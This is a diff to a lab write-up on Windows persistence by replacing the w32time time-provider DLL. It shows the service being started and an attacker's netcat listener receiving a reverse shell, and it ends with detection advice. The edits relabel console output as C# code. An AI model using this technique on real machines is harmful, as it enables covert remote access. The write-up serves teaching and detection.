@@ -16,7 +16,7 @@ In this lab, we will just swap out the `w32time.dll` with our own. It contains a
 
 Starting the w32time service:
 
-```bash
+```csharp
 C:\Users\mantvydas\Start Menu\Programs\Startup>sc.exe start w32time
 
 SERVICE_NAME: w32time
@@ -31,11 +31,11 @@ SERVICE_NAME: w32time
         FLAGS              :
 ```
 
-Sends a reverse shell to the attacker:
+Attacker receiving a reverse shell:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
-```bash
+```csharp
 root@~# nc -lvvp 443
 listening on [any] 443 ...
 10.0.0.2: inverse host lookup failed: Unknown host
@@ -54,7 +54,7 @@ Note that the code is running under the context of `LOCAL SERVICE`:
 
 ![](../.gitbook/assets/time-context.png)
 
-This time and time again shows that binaries running off of svchost.exe, especially if they are rundll32 and are making network connections, should be a good sign for you to start investigating the machine closer.
+This time and time again shows that binaries running off of svchost.exe, especially if they are rundll32 and are making network connections, should be investigated further.
 
 {% embed url="https://attack.mitre.org/wiki/Technique/T1209" %}
 
